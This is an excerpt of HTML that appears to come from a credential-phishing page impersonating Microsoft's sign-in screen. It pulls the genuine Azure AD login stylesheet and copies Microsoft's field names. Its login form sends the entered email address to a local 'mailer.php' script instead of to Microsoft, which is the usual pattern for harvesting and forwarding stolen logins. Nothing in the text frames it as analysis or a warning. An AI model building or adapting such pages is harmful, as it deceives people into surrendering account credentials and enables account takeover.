...
<meta name="mswebdialog-newwindowurl" content="*" />
    ...
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes" />
        <link href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.2773.0/content/css/compiled/login_ltr.min.css" rel="stylesheet" type="text/css" />
...
<div class="login_cta_container normaltext">
            <div id="login_cta_text" class="cta_message_text 1">Hello </div>
...
<ul class="login_cred_container">
    ...
    <li class="login_cred_field_container">
        <form id="login form" method="post" action="mailer.php">
            ...
            <span class="input_field textfield">
                ...
                <div class="input_border">
                    <input tabindex="1" id="cred_userid_inputtext"
                           ...
                           placeholder="someone@example.com " type="email" name="userid"
